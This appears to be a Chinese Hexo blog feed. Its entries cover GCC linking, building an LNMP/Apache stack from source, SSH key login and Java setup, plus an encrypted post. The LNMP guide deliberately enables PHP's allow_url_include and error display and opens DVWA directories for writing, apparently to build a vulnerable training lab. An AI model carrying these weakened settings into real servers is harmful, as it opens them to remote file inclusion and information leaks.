377c6d5d67822e905f859fcd4d1176ca02798bfb8471074c069ab3a51f863ce5072206a42bafb2c54940688cbebcd7257b9ae102d37b37b44c543e814e978326a3ba680bc16013046bbb67c25894c56b1501bad2da916eb675de0c4aa947e64ce83111a8b245ffdb21f78c9c074500e0203bd71b6d03e20bd86050e4b329dc9714ed732ef9e6ebc68020a3694344eaae8acf4f1e8bf0923b689734c604f17115dda304c653f56f596b010d6509ca45ffc6f3087e787d7ac1cf670e2f9652bf7d5bf353a7f4f130ed48ff61906a021468583f06c59f0d321870c6d1d7ee4a981d7f4ff12df43a71176bdb21138299c93e6a7a43128508b3471ea95cae7375a49353e353bed880c3ff4b5fe661cfd653f817c7d0d4f5f59cda3af766237ba4d86e9e6689df6f5355e4f00ebdbbe57405ff8ba9929528f29ba4d94d55d9431fd901963b810e509099110da40ae047cb7d86967df77d1ee835c2feb5b996b2a830998d628a51376d45e2f09e720fea348a285eeb6d429b3a70d708aacb9633e1e7193e9b6bb382db874d911aea557c841724e68cbbaa71ff022376f5e869384d54015ec9da174af8467771f931d972de0a9cb79ef686c38e12b9e6409226217e68c1d09677854d9593f308853566475a69557645d98a39fb8f85b9d60067a781c1dd77e501ba40010af585fb9096c6d63ee539eb799de516da8b3ebadc5e8dabf56d1bc3ea4022bfb178f23bb507ef77335e0b7e0b1aa4355319b0e626ef14bedb6adef573867904ebde6ec1b30e3cabb6b3e5b0723a1efad92bf50acaf8538b6eec8d6826352543d0c176936de9cd9ace3b5c743921ea9b1346fc7c111800b0c5950a05d83fcb72bd0346969a2c02628f7ad0292a060a46a22284a3b9cfb59c860e8fc414a20aadf804e224e4b6053a4de378ef1a290302dbfd23862cc9dd1836719fdf5c774c077f72ad43c9c72c749d89161c9f7588545ba408cae0e1911647e1bd7ae887494cc579f9036336f83e8e5ab0cb129eba2cb2dac5ab4992d9af68bc31fa4db55189b80c5a06929880a18b571b89e2c2306d783f77ece2556f958c7aded8f31d4a3ad1551caa7b4b4b1d8c08e2c32fa24a7e11b9546209184d9cc325bd6163acf8308d179213f528a643787a2a79bd9ef41094d0f53a62ba9ad1e5fb1d60c44cdd181d7bc68a494ed07be346a82149b2810e8201888ebecec68004a9a939414dfbb5a4e6ffc165fc125e2e0beb34cd9ae9146d964a3c6f332be92ad95f1a64f9b639a38802476d7b7688b9854f2601cd24a0f3a499b4dfa1decf8e7f9ba8af5e0762573edcebb9ca1db2551d3adc4b111591e4cc1c0a9bf2f96c54341eec0eedd5b7c270fa52e430dfef4ff0ae7ce8bcac4c566eacac9eb806487302d64277fc1778536759ed53cf40977c2835cfa1027ad195d3b3e11122071f581bc243400dd5f851caedf3cb399c8b2df25cfabf66da2a11bb5a62d00260aca6ef3ecb35f0d84598e0e64e9ab0c714b7593f3939f63bd167060d63abeb82a3ef29b79486b62ccfd39aa1acd840c69fba42217c30f2e610fa7c3cf7af4f23061ec7cde71eb6f46596359dd9a20a467fb8a3ba260ba6fb5e9d6e4af296c441c08a8130b032e36cc07090ea0fe09b0a913bff8cc2c4fdc81bd040f4ee4e10ccab84c36040d320b96f52b7d3cf45172c636d2a79d10d8a68aebd47deb12da1c2b88ec1ebf30952e5f37b37ca7b8255092354eaf0e056ca8f3ed74f89a1b3baf082918d7ddc3813324669542463451aa14e69f2a36afc0d6cffcb2a09e639380416606ca519501bdaf81230635da1827bcc554d316ecafc485c4c46adc2bc2d58f1849db90f4c9b37d08e6fc82aab23c7ebdf2ffd40c660fc8a46638678905ad3bd45d54f466abe88fefd06961fa2cd26a5ec4c55c5bff384b493df2b227d32cc65210d2fc5417a9bc5f6b39a2fddd795b62c8fbe981ee5e6d543b7ab0774b3ea528d73b2f5b89c7db9ac11ba8eb4a1176057d5174d8f6c097283c7509c45db90647e6814570b1fcd55d4841d2c2c610458d178e00ff5fdabf64dea079e8685cb3cd272a75e008c12d0150f133f0f78e84ca20de16c8478353b0eb565b8dfdff86820916b50f21c27c3edbdb33323c27d47350764ec883deaca906d78fdb373ce20fa9d6042c3304b22300aa86b76f6f8671416ef97bc5ecaa581c3c82e07f143bf49bb5cb508536f5f7c97ebd96d0c43d82a1c87938779087b01139af1492770d4aa614124750537a3006bd19d7b9b0799a3e4a1d7bdd3e038391e2e1efe5273bbab920ac676fd51efebee46b234a5699301ebaa6d1b8b313865a3c9ac19d481641b312eb6b2838145ac3b45e580ae97c4d5695c96568527198289c0eaf31f510563fc7bc4e5d54bb86f61a4d2084bba52acb81b56669943cccdea6b62b02a7cdaac652a65f166a5fa1e2de43df6474635b90f7c3fdad4171a6623aa5ceaa3300fea6cf85e6685e165523dafe43aedc5b7ed1611a37f14d99a132e8733913f262f3af470ab07b1511cf04bbed8b8af45c983b57722ee3700d54ba7538fc5bac505cf8534d59bbd7c5a478b6d9384f7787b08ec7afeb5955f37ab314325275c4341dc3a915f58c2ab8afd3ff0cdaa1c036d329656ecb0c9a359c3fc94f3cca73bcad286911fcbaf80e28bc4e955a32d6f8f3046ab17930cf3be62959fae6c70532c1b99c763c0e04d17673fdf7f259b40087801c5c996210603550e500f34dd4b99d382755c4fea6041f1e42dc922ab55919072008fcf1ac70f36a0218f05f5569364febc61815714decf5ee5606eb4e0e9c5215fdf2a9669f49b3817aee0ccd390441bbd8f8c45be70b289838b12664f0a4bd3d58818c03b8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>摄影教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Photograph</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言基础</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/C/C%E8%AF%AD%E8%A8%80/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/C/C%E8%AF%AD%E8%A8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="GCC编译"><a href="#GCC编译" class="headerlink" title="GCC编译"></a>GCC编译</h1><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><p><strong>CentOS</strong></p><div class="code-wrapper"><pre><code class="hljs gml">yum install gcc -<span class="hljs-variable language_">y</span>yum groupinstall <span class="hljs-string">&quot;Development Tools&quot;</span> -<span class="hljs-variable language_">y</span></code></pre></div><h2 id="编译方式"><a href="#编译方式" class="headerlink" title="编译方式"></a>编译方式</h2><ul><li>动态链接编译</li></ul><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-comment">#仅生成可执行文件，不包含依赖的库，如果目标系统上缺少依赖的库文件，则会运行报错</span><span class="hljs-attribute">gcc</span> -o hello hello.c</code></pre></div><ul><li>静态链接编译</li></ul><div class="code-wrapper"><pre><code class="hljs autoit"><span class="hljs-meta">#将所有库打包到可执行文件中，移植到其他系统上通常可正常运行，缺点文件体积大</span>gcc -<span class="hljs-keyword">static</span> -o hello hello.c</code></pre></div><h2 id="系统兼容性的关键点"><a href="#系统兼容性的关键点" class="headerlink" title="系统兼容性的关键点"></a>系统兼容性的关键点</h2><ul><li>CPU架构</li></ul><p>必须在相同架构（如x86_64）上运行，ARM架构无法执行x86编译的程序。</p><ul><li>内核版本</li></ul><p>静态编译的程序可能依赖高版本内核的系统调用，在旧内核上存在崩溃的可能。</p><ul><li>glibc版本</li></ul><p>动态链接的程序要求目标系统的glibc版本大于等于编译环境的版本。</p><ul><li>其他依赖库</li></ul><p>若程序使用了第三方库（如OpenSSL），需确保目标系统有兼容版本。</p>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>C</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LNMP安装</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/PHP/LNMP%E5%AE%89%E8%A3%85/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/PHP/LNMP%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h1 id="LANMP安装"><a href="#LANMP安装" class="headerlink" title="LANMP安装"></a>LANMP安装</h1><p>软件官网：</p><div class="code-wrapper"><pre><code class="hljs awk">Nginx：http:<span class="hljs-regexp">/nginx.org/</span>cmake编译器：https:<span class="hljs-regexp">/cmake.org/</span>download/Boost库：https:<span class="hljs-regexp">/www.boost.org/u</span>sers<span class="hljs-regexp">/download/</span>MySQL：https:<span class="hljs-regexp">/dev.mysql.com/</span>downloads<span class="hljs-regexp">/mysql/</span>PHP：https:<span class="hljs-regexp">/www.php.net/</span>Apache: https:<span class="hljs-regexp">/archive.apache.org/</span>dist<span class="hljs-regexp">/httpd/</span></code></pre></div><p>软件版本：</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nginx</span>：nginx-<span class="hljs-number">1</span>.<span class="hljs-number">18</span>.<span class="hljs-number">0</span><span class="hljs-attribute">cmake</span>：cmake-<span class="hljs-number">3</span>.<span class="hljs-number">6</span>.<span class="hljs-number">0</span>-rc1<span class="hljs-attribute">boost</span>：boost_1_59_0<span class="hljs-attribute">mysql</span>：mysql-<span class="hljs-number">5</span>.<span class="hljs-number">7</span>.<span class="hljs-number">24</span><span class="hljs-attribute">php</span>：php-<span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">12</span></code></pre></div><p>安装路径：</p><div class="code-wrapper"><pre><code class="hljs awk">nginx：<span class="hljs-regexp">/usr/</span>local/nginxcmake：<span class="hljs-regexp">/root/</span>cmake-<span class="hljs-number">3.6</span>.<span class="hljs-number">0</span>-rc1boost：boost_1_59_0.tar.bz2mysql：<span class="hljs-regexp">/usr/</span>local/mysqlphp：<span class="hljs-regexp">/usr/</span>local/php</code></pre></div><h1 id="Linux基础环境"><a href="#Linux基础环境" class="headerlink" title="Linux基础环境"></a><strong>Linux基础环境</strong></h1><div class="code-wrapper"><pre><code class="hljs gml">yum -<span class="hljs-variable language_">y</span> groupinstall <span class="hljs-string">&quot;Development Tools&quot;</span>yum -<span class="hljs-variable language_">y</span> install pcre-devel openssl-devel expat-devel wget curl vim lsof net-tools unzip elinks</code></pre></div><h1 id="安装Apache"><a href="#安装Apache" class="headerlink" title="安装Apache"></a>安装Apache</h1><p>下载</p><div class="code-wrapper"><pre><code class="hljs jboss-cli">wget https:<span class="hljs-string">//archive.apache.org/dist/httpd/httpd-2.4.46.tar.gz</span>tar -xf httpd-2.4.46.tar.gz<span class="hljs-keyword">cd</span> httpd-2.4.46/<span class="hljs-string">./configure</span> <span class="hljs-params">--prefix=/usr/local/httpd</span> <span class="hljs-params">--enable-so</span> <span class="hljs-params">--enable-ssl</span> <span class="hljs-params">--enable-rewrite</span> <span class="hljs-params">--with-pcre</span> <span class="hljs-params">--with-mpm=prefork</span></code></pre></div><h1 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a><strong>安装Nginx</strong></h1><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a><strong>安装依赖</strong></h2><div class="code-wrapper"><pre><code class="hljs nsis">yum -y install gcc <span class="hljs-literal">zlib</span> <span class="hljs-literal">zlib</span>-devel pcre-devel openssl openssl-devel</code></pre></div><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><div class="code-wrapper"><pre><code class="hljs jboss-cli">wget https:<span class="hljs-string">//nginx.org/download/nginx-1.18.0.tar.gz</span>tar -xf nginx-1.18.0.tar.gz<span class="hljs-keyword">cd</span> nginx-1.18.0<span class="hljs-string">./configure</span> <span class="hljs-params">--prefix=/usr/local/nginx</span> <span class="hljs-params">--with-http_stub_status_module</span> <span class="hljs-params">--with-http_ssl_module</span></code></pre></div><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a><strong>编译</strong></h2><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">make</span> -j <span class="hljs-number">4</span></code></pre></div><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a><strong>安装</strong></h2><div class="code-wrapper"><pre><code class="hljs cmake">make <span class="hljs-keyword">install</span></code></pre></div><h1 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h1><h2 id="安装依赖-1"><a href="#安装依赖-1" class="headerlink" title="安装依赖"></a><strong>安装依赖</strong></h2><div class="code-wrapper"><pre><code class="hljs maxima">yum -y install gcc-c++ libxml2 libxml2-devel openssl openssl-devel bzip2 bzip2-devel libcurl libcurl-devel libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel gmp gmp-devel libmcrypt libmcrypt-devel <span class="hljs-built_in">readline</span> <span class="hljs-built_in">readline</span>-devel libxslt libxslt-devel <span class="hljs-built_in">gd</span> net-snmp net-snmp-devel oniguruma-devel sqlite-devel freetype-devel libjpeg-devel libpng-devel libwebp-devel libXpm-devel <span class="hljs-built_in">gd</span>-devel</code></pre></div><h2 id="配置模块"><a href="#配置模块" class="headerlink" title="配置模块"></a><strong>配置模块</strong></h2><div class="code-wrapper"><pre><code class="hljs jboss-cli">wget https:<span class="hljs-string">//www.php.net/distributions/php-7.4.32.tar.gz</span>tar -xf php-7.4.32.tar.gz<span class="hljs-keyword">cd</span> php-7.4.32<span class="hljs-string">./configure</span> \    <span class="hljs-params">--prefix=/usr/local/php</span> \    <span class="hljs-params">--with-config-file-path=/usr/local/php/etc</span> \    <span class="hljs-params">--enable-fpm</span> \    <span class="hljs-params">--with-fpm-user=www</span> \    <span class="hljs-params">--with-fpm-group=www</span> \    <span class="hljs-params">--enable-mbstring</span> \    <span class="hljs-params">--enable-opcache</span> \    <span class="hljs-params">--enable-pdo</span> \    <span class="hljs-params">--enable-xml</span> \    <span class="hljs-params">--enable-bcmath</span> \    <span class="hljs-params">--enable-calendar</span> \    <span class="hljs-params">--enable-shmop</span> \    <span class="hljs-params">--enable-sockets</span> \    <span class="hljs-params">--enable-pcntl</span> \    <span class="hljs-params">--enable-zip</span> \    <span class="hljs-params">--with-zlib</span> \    <span class="hljs-params">--with-bz2</span> \    <span class="hljs-params">--with-curl</span> \    <span class="hljs-params">--with-gettext</span> \    <span class="hljs-params">--with-mhash</span> \    <span class="hljs-params">--with-mysqli=mysqlnd</span> \    <span class="hljs-params">--with-pdo-mysql=mysqlnd</span> \    <span class="hljs-params">--enable-gd</span> \    <span class="hljs-params">--with-freetype</span> \    <span class="hljs-params">--with-jpeg</span> \    <span class="hljs-params">--with-webp</span> \    <span class="hljs-params">--with-xpm</span> \    <span class="hljs-params">--with-libxml</span> \    <span class="hljs-params">--disable-debug</span> \    <span class="hljs-params">--disable-ipv6</span> \    <span class="hljs-params">--disable-phar</span> \    <span class="hljs-params">--disable-rpath</span></code></pre></div><h2 id="编译-1"><a href="#编译-1" class="headerlink" title="编译"></a><strong>编译</strong></h2><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">make</span> -j <span class="hljs-number">4</span></code></pre></div><h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a><strong>安装</strong></h2><div class="code-wrapper"><pre><code class="hljs cmake">make <span class="hljs-keyword">install</span></code></pre></div><h1 id="安装MySQL-可选"><a href="#安装MySQL-可选" class="headerlink" title="安装MySQL(可选)"></a><strong>安装MySQL(可选)</strong></h1><h2 id="安装依赖-2"><a href="#安装依赖-2" class="headerlink" title="安装依赖"></a><strong>安装依赖</strong></h2><div class="code-wrapper"><pre><code class="hljs mipsasm">yum -y <span class="hljs-keyword">install </span>ncurses-devel <span class="hljs-keyword">install </span>gcc-* <span class="hljs-keyword">bzip2-* </span><span class="hljs-keyword">bison</span></code></pre></div><h2 id="安装cmake"><a href="#安装cmake" class="headerlink" title="安装cmake"></a><strong>安装cmake</strong></h2><div class="code-wrapper"><pre><code class="hljs vim">tar -xvf cmake-<span class="hljs-number">3.6</span>.<span class="hljs-number">0</span>-rc1.tar.gz<span class="hljs-keyword">cd</span> cmake-<span class="hljs-number">3.6</span>.<span class="hljs-number">0</span>-rc1./configure<span class="hljs-keyword">make</span> &amp;&amp; <span class="hljs-keyword">make</span> install</code></pre></div><h2 id="安装Boost库"><a href="#安装Boost库" class="headerlink" title="安装Boost库"></a><strong>安装Boost库</strong></h2><div class="code-wrapper"><pre><code class="hljs bash">tar -xvf boost_1_59_0.tar.bz2<span class="hljs-built_in">mv</span> ./boost_1_59_0 /usr/local/boost/</code></pre></div><h2 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a><strong>安装MySQL</strong></h2><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -xf mysql-<span class="hljs-number">5</span>.<span class="hljs-number">7</span>.<span class="hljs-number">24</span>.tar.gz</code></pre></div><h3 id="cmake编译"><a href="#cmake编译" class="headerlink" title="cmake编译"></a><strong>cmake编译</strong></h3><div class="code-wrapper"><pre><code class="hljs routeros">cmake . <span class="hljs-attribute">-DCMAKE_INSTALL_PREFIX</span>=/usr/local/mysql  \<span class="hljs-attribute">DMYSQL_DATADIR</span>=/usr/local/mysql/data/ \<span class="hljs-attribute">DMYSQL_UNIX_ADDR</span>=/usr/local/mysql/mysql.sock \<span class="hljs-attribute">DWITH_INNOBASE_STORAGE_ENGINE</span>=1 \<span class="hljs-attribute">DWITH_MYISAM_STORAGE_ENGINE</span>=1 \<span class="hljs-attribute">DENABLED_LOCAL_INFILE</span>=1 \<span class="hljs-attribute">DEXTRA_CHARSETS</span>=all <span class="hljs-attribute">-DDEFAULT_CHARSET</span>=utf8 <span class="hljs-attribute">-DDEFAULT_COLLATION</span>=utf8_general_ci \<span class="hljs-attribute">DWITH_DEBUG</span>=0 \<span class="hljs-attribute">DWITH_EMBEDDED_SERVER</span>=1 \<span class="hljs-attribute">DDOWNLOAD_BOOST</span>=1 <span class="hljs-attribute">-DENABLE_DOWNLOADS</span>=1 <span class="hljs-attribute">-DWITH_BOOST</span>=/usr/local/boost</code></pre></div><h3 id="编译-2"><a href="#编译-2" class="headerlink" title="编译"></a><strong>编译</strong></h3><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">make</span> -j <span class="hljs-number">4</span></code></pre></div><h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a><strong>安装</strong></h3><div class="code-wrapper"><pre><code class="hljs cmake">make <span class="hljs-keyword">install</span></code></pre></div><h1 id="综合配置"><a href="#综合配置" class="headerlink" title="综合配置"></a>综合配置</h1><h2 id="配置PHP"><a href="#配置PHP" class="headerlink" title="配置PHP"></a>配置PHP</h2><div class="code-wrapper"><pre><code class="hljs gradle">cp <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/php/</span>etc<span class="hljs-regexp">/php-fpm.conf.default /u</span>sr<span class="hljs-regexp">/local/</span>php<span class="hljs-regexp">/etc/</span>php-fpm.confcp <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/php/</span>etc<span class="hljs-regexp">/php-fpm.d/</span>www.conf.<span class="hljs-keyword">default</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/php/</span>etc<span class="hljs-regexp">/php-fpm.d/</span>www.confcp <span class="hljs-regexp">/root/</span>php-<span class="hljs-number">7.4</span>.<span class="hljs-number">32</span><span class="hljs-regexp">/php.ini-production /u</span>sr<span class="hljs-regexp">/local/</span>php<span class="hljs-regexp">/etc/</span>php.ini</code></pre></div><p><strong>vim &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php-fpm.conf</strong></p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[global]</span><span class="hljs-attr">pid</span> = run/php-fpm.pid<span class="hljs-attr">error_log</span> = log/php-fpm.log<span class="hljs-attr">daemonize</span> = <span class="hljs-literal">yes</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs awk">sed -i <span class="hljs-string">&quot;s/allow_url_include = Off/allow_url_include = On/&quot;</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/php/</span>etc/php.inised -i <span class="hljs-string">&quot;s/display_errors = Off/display_errors = On/&quot;</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/php/</span>etc/php.inised -i <span class="hljs-string">&quot;s/display_startup_errors = Off/display_startup_errors = On/&quot;</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/php/</span>etc/php.ini</code></pre></div><p>启动</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/php/</span>sbin/php-fpm</code></pre></div><p>停止</p><div class="code-wrapper"><pre><code class="hljs perl">ps aux | <span class="hljs-keyword">grep</span> php-fpm<span class="hljs-keyword">kill</span> -TERM master进程PID</code></pre></div><h2 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h2><p><strong>vim &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</strong></p><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-section">location</span> / &#123;<span class="hljs-attribute">root</span>  html;<span class="hljs-attribute">index</span>  index.php index.html index.htm;&#125;<span class="hljs-section">location</span> <span class="hljs-regexp">~ \.php$</span> &#123;<span class="hljs-attribute">root</span>html;<span class="hljs-attribute">fastcgi_pass</span>  <span class="hljs-number">127.0.0.1:9000</span>;<span class="hljs-attribute">fastcgi_index</span>  index.php;<span class="hljs-attribute">fastcgi_param</span> SCRIPT_FILENAME  /usr/local/nginx/html/<span class="hljs-variable">$fastcgi_script_name</span>;<span class="hljs-attribute">include</span>     fastcgi_params;&#125;</code></pre></div><p><strong>启动</strong></p><div class="code-wrapper"><pre><code class="hljs awk">启动：<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin/nginx停止服务：<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin/nginx -s stop重新加载配置：<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin/nginx -s reload重新打开日志文件：<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin/nginx -s reopen测试配置文件：<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin/nginx -t</code></pre></div><h2 id="配置MySQL"><a href="#配置MySQL" class="headerlink" title="配置MySQL"></a>配置MySQL</h2><div class="code-wrapper"><pre><code class="hljs awk">cp <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span>support-files<span class="hljs-regexp">/mysql.server /</span>etc<span class="hljs-regexp">/init.d/my</span>sqlchmod <span class="hljs-number">755</span> <span class="hljs-regexp">/etc/i</span>nit.d/mysqluseradd -s <span class="hljs-regexp">/sbin/</span>nologin -r mysqlchown mysql.mysql <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span> -Rln -sf <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span>bin<span class="hljs-regexp">/* /u</span>sr<span class="hljs-regexp">/bin/</span>ln -sf <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span>lib<span class="hljs-regexp">/* /u</span>sr<span class="hljs-regexp">/lib/</span>ln -sf <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span>libexec<span class="hljs-regexp">/* /u</span>sr<span class="hljs-regexp">/libexec/</span>ln -sf <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span>share<span class="hljs-regexp">/man/m</span>an1<span class="hljs-regexp">/* /u</span>sr<span class="hljs-regexp">/share/m</span>an/man1ln -sf <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span>share<span class="hljs-regexp">/man/m</span>an8<span class="hljs-regexp">/* /u</span>sr<span class="hljs-regexp">/share/m</span>an/man8</code></pre></div><p><strong>vim &#x2F;etc&#x2F;my.cnf</strong></p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span><span class="hljs-attr">basedir</span>=/usr/local/mysql<span class="hljs-attr">datadir</span>=/usr/local/mysql/data<span class="hljs-attr">socket</span>=/usr/local/mysql/mysql.sock<span class="hljs-attr">symbolic-links</span>=<span class="hljs-number">0</span><span class="hljs-section">[mysqld_safe]</span><span class="hljs-attr">log-error</span>=/usr/local/mysql/log/mysql.log<span class="hljs-attr">pid-file</span>=/usr/local/mysql/run/mysql.pid</code></pre></div><p><strong>启动MySQL</strong></p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/i</span>nit.d/mysql start<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span>bin<span class="hljs-regexp">/mysqld --initialize --user=mysql --basedir=/u</span>sr<span class="hljs-regexp">/local/my</span>sql<span class="hljs-regexp">/ --datadir=/u</span>sr<span class="hljs-regexp">/local/my</span>sql<span class="hljs-regexp">/data/</span>mysql_secure_installationmysql -uroot -p</code></pre></div><h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><div class="code-wrapper"><pre><code class="hljs php-template"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; &gt; /usr/local/nginx/html/phpinfo.php</span></code></pre></div><p><strong>访问</strong></p><div class="code-wrapper"><pre><code class="hljs arcade">http:<span class="hljs-regexp">/IP/</span>phpinfo.php</code></pre></div><p>CPU架构：x86_64</p><p>内核版本：3.10.0-1160.119.1.el7.x86_64</p><p>路径：&#x2F;usr&#x2F;local</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> -fL $(ldd /usr/local/nginx/sbin/nginx | awk <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span> | grep -v vdso) /usr/local/nginx/lib/<span class="hljs-built_in">cp</span> -fL $(ldd /usr/local/php/sbin/php-fpm | awk <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span> | grep -v vdso) /usr/local/php/lib/<span class="hljs-built_in">cp</span> -fL $(ldd /usr/local/php/bin/php | awk <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span> | grep -v vdso) /usr/local/php/lib/<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export LD_LIBRARY_PATH=/usr/local/nginx/lib/:/usr/local/php/lib/:<span class="hljs-variable">$LD_LIBRARY_PATH</span>&quot;</span> &gt;&gt; /etc/profile<span class="hljs-built_in">source</span> /etc/profile<span class="hljs-built_in">chmod</span> +w /usr/local/nginx/html/dvwa/hackable/uploads<span class="hljs-built_in">chmod</span> +w /usr/local/nginx/html/dvwa/config</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSH教程</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Linux/SSH/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Linux/SSH/</url>
    
    <content type="html"><![CDATA[<h1 id="SSH实现免密登录"><a href="#SSH实现免密登录" class="headerlink" title="SSH实现免密登录"></a>SSH实现免密登录</h1><p>在本地生成密钥对，可设置秘钥</p><div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span></code></pre></div><p>将公钥上传到远程服务器</p><div class="code-wrapper"><pre><code class="hljs applescript">ssh-<span class="hljs-keyword">copy</span>-<span class="hljs-built_in">id</span> root@<span class="hljs-number">10.58</span><span class="hljs-number">.125</span><span class="hljs-number">.35</span></code></pre></div><p>即可实现免密登录</p><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> root@<span class="hljs-number">10.58.125.35</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>软件教程</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安装</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/Java/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/Java/</url>
    
    <content type="html"><![CDATA[<h1 id="环境变量配置"><a href="#环境变量配置" class="headerlink" title="环境变量配置"></a>环境变量配置</h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><div class="code-wrapper"><pre><code class="hljs python">setx JAVA_HOME <span class="hljs-string">&quot;C:\Program Files\Java\jdk1.8.0_65&quot;</span>setx CLASSPATH <span class="hljs-string">&quot;&quot;</span>.;%JAVA_HOME%\<span class="hljs-built_in">bin</span>;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.ja<span class="hljs-string">r&quot;</span><span class="hljs-string">setx Path &quot;</span>%Path%;%JAVA_HOME%\<span class="hljs-built_in">bin</span><span class="hljs-string">&quot;</span></code></pre></div><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><div class="code-wrapper"><pre><code class="hljs routeros">cat &lt;&lt; EOF &gt;&gt; /etc<span class="hljs-built_in">/profile</span><span class="hljs-built_in"></span><span class="hljs-built_in">export</span> <span class="hljs-attribute">JAVA_HOME</span>=/usr/local/jdk1.8.0_65<span class="hljs-built_in">export</span> <span 